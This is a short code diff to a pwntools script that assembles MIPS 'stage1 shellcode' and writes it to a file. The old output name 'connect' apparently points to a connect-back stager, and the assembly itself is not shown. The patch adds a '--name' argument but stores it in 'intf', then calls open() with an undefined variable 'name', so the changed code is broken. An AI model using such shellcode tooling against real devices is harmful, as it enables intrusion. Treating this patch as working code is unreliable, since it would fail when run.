@@ -1,4 +1,12 @@
 from pwn import *
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--name', help='output name of stage1 shellcode',required=True)
+
+args = parser.parse_args()
+intf = args.name
+
 
 context.clear()
 context.arch = 'mips'
@@ -50,7 +58,7 @@ read_loop_8:
 
 a = asm(shellcode)
 
-o = open('connect','wb')
+o = open(name,'wb')
 o.write(a)
 o.flush()
 o.close()
